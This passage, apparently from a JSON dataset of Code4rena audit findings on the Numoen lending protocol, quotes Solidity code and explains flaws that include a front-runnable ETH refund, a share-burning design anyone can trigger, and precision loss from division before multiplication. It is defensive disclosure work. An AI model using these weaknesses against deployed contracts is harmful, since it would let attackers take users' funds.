class=\"mtk7\">195</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Info</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// SLOAD</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralRequested</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">collateralRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// SSTORE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">203</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Collect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>You can see that this is already applied in a similar function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">periphery</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidityManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">collect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CollectParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ILendgine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">accruePositionInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) : </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// SLOAD</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:    (, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardPerPositionPaid</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">ILendgine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">positions</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardPerPositionPaid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardPerPositionPaid</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardPerPositionPaid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rewardPerPositionPaid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amountRequested</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amountRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// SSTORE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendgine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">collect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectAmount</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CollectError</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// extra check for safety</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Collect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lendgine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">:  }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "#l-03-the-function-collect-forgets-to-accrue-position-interest-before-the-user-collects-the-interest-of-his-position",
      "tags": [],
      "finders": []
    },
    {
      "id": "6518",
      "title": "[L-02] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-refundeth-can-be-front-run-preventing-users-from-getting-their-eth-back\" style=\"position:relative;\"><a href=\"#l-02-refundeth-can-be-front-run-preventing-users-from-getting-their-eth-back\" aria-label=\"l 02 refundeth can be front run preventing users from getting their eth back permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>refundETH</code> can be front-run preventing users from getting their eth back</h2>\n<p>The function <code>refundETH</code> in Payment.sol is used by users to get their ether back if they send more than the needed amount when using the function <code>pay</code>. The problem here is as how the function is designed, any eth values in the contract can be withdrawn by anyone. This bring the risk, where a malicious users can front-run users and successfuly steal their refunds.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">periphery</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Payment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">refundETH</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:  }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "#l-02-refundeth-can-be-front-run-preventing-users-from-getting-their-eth-back",
      "tags": [],
      "finders": []
    },
    {
      "id": "6517",
      "title": "[L-01] Dangerous use of the ",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-dangerous-use-of-the-burn-function\" style=\"position:relative;\"><a href=\"#l-01-dangerous-use-of-the-burn-function\" aria-label=\"l 01 dangerous use of the burn function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Dangerous use of the <code>burn</code> function</h2>\n<p>The function <code>burn</code> is used by users to burn an option position by minting the required liquidity and unlocking the collateral.:br\nAs how the function is designed right now in order to do that, the user needs to send his shares to the contract balance.:br\nThis is simply too risky, as anyone can call the function and basically burn the shares deposited by the users, before they even get the chance to call the function first.</p>\n<p>Instead of the need to send the shares to the contract balance, the function can be refactored to check the balance of shares the user posses and to burn them in the moment of execution or on top of that to input a uint value of how many shares the user wants to burn. </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lendgine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_accrueInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">convertShareToLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">convertLiquidityToCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InputError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">totalLiquidityBorrowed</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// optimistically transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:  }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "#l-01-dangerous-use-of-the-burn-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6516",
      "title": "[M-06] Division before multiplication incurs unnecessary precision loss",
      "impact": "MEDIUM",
      "content": "\n[src/core/Pair.sol#L56](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56)<br>\n[src/core/Pair.sol#L57](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L57)<br>\n[core/Lendgine.sol#L252](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Lendgine.sol#L252)\n\n### Proof of Concept\n\nIn the current codebase, FullMath.mulDiv is used, the function takes three parameters.\n\nBasically `FullMath.mulDIv(a, b, c)` means `a * b / c`.\n\nThen there are some operations which incur unnecessary precision loss because of division before multiplcation.\n\nWhen accruing interest, the code below:\n\n```solidity\n  /// @notice Helper function for accruing lendgine interest\n  function _accrueInterest() private {\n    if (totalSupply == 0 || totalLiquidityBorrowed == 0) {\n      lastUpdate = block.timestamp;\n      return;\n    }\n\n    uint256 timeElapsed = block.timestamp - lastUpdate;\n    if (timeElapsed == 0) return;\n\n    uint256 _totalLiquidityBorrowed = totalLiquidityBorrowed; // SLOAD\n    uint256 totalLiquiditySupplied = totalLiquidity + _totalLiquidityBorrowed; // SLOAD\n\n    uint256 borrowRate = getBorrowRate(_totalLiquidityBorrowed, totalLiquiditySupplied);\n\n    uint256 dilutionLPRequested = (FullMath.mulDiv(borrowRate, _totalLiquidityBorrowed, 1e18) * timeElapsed) / 365 days;\n    uint256 dilutionLP = dilutionLPRequested > _totalLiquidityBorrowed ? _totalLiquidityBorrowed : dilutionLPRequested;\n    uint256 dilutionSpeculative = convertLiquidityToCollateral(dilutionLP);\n\n    totalLiquidityBorrowed = _totalLiquidityBorrowed - dilutionLP;\n    rewardPerPositionStored += FullMath.mulDiv(dilutionSpeculative, 1e18, totalPositionSize);\n    lastUpdate = block.timestamp;\n\n    emit AccrueInterest(timeElapsed, dilutionSpeculative, dilutionLP);\n  }\n```\n\nNote the line:\n\n```solidity\n uint256 dilutionLPRequested = (FullMath.mulDiv(borrowRate, _totalLiquidityBorrowed, 1e18) * timeElapsed) / 365 days;\n```\n\nThis basically equals to `dilutionLPRequested = (borrowRate * totalLiquidityBorrowed / 1e18 * timeElapsed) / 365 days`\n\nThe first part of division can greatly truncate the value `borrowRate * totalLiquidityBorrowed / 1e18`, the totalLiquidityBorrowed should be normalized and scaled by token precision when adding liqudity instead of division by 1e18 here.\n\nSame preicision loss happens when computng the invariant\n\n```solidity\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n```\n\n`scale0 = (amount0 * 1e18 / liqudiity) * token0Scale`<br>\n`scale1 = (amount1 * 1e18 / liqudiity) * token1Scale`\n\nWhereas the amount0 and amount1 should be first be normalized by token0Scale and token1Scale and then divided by liquidity at last. If the liquidity is a larger number  `amount0 * 1e18 / liqudity` is already truncated to 0.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol avoid divison before multiplication and always perform division operation at last.\n\n**[kyscott18 (Numoen) confirmed](https://github.com/code-423n4/2023-01-numoen-findings/issues/45#issuecomment-1423236922)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the codebase of a software system. The vulnerability is that the code is performing division before multiplication, which is causing unnecessary precision loss. This is happening when accruing interest and when computing an invariant.\n\nProof of concept is provided with the report, which shows that the code is performing division before multiplication, which is causing the precision loss. The code first divides the value borrowRate * totalLiquidityBorrowed / 1e18, and when computing the invariant, it divides amount0 * 1e18 / liqudiity.\n\nThe impact of this vulnerability is that it causes unnecessary precision loss.\n\nThe bug was identified using manual review.\n\nThe recommended mitigation step is to avoid division before multiplication and always perform division operation at last.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/45",
      "tags": [
        "Precision Loss"
      ],
      "finders": [
        "ladboy233",
        "Breeje"
      ]
    },
    {
      "id": "6515",
      "title": "[M-05] Borrower can lose partial fund during minting of Power Token as excess ETH are not refunded automatically",
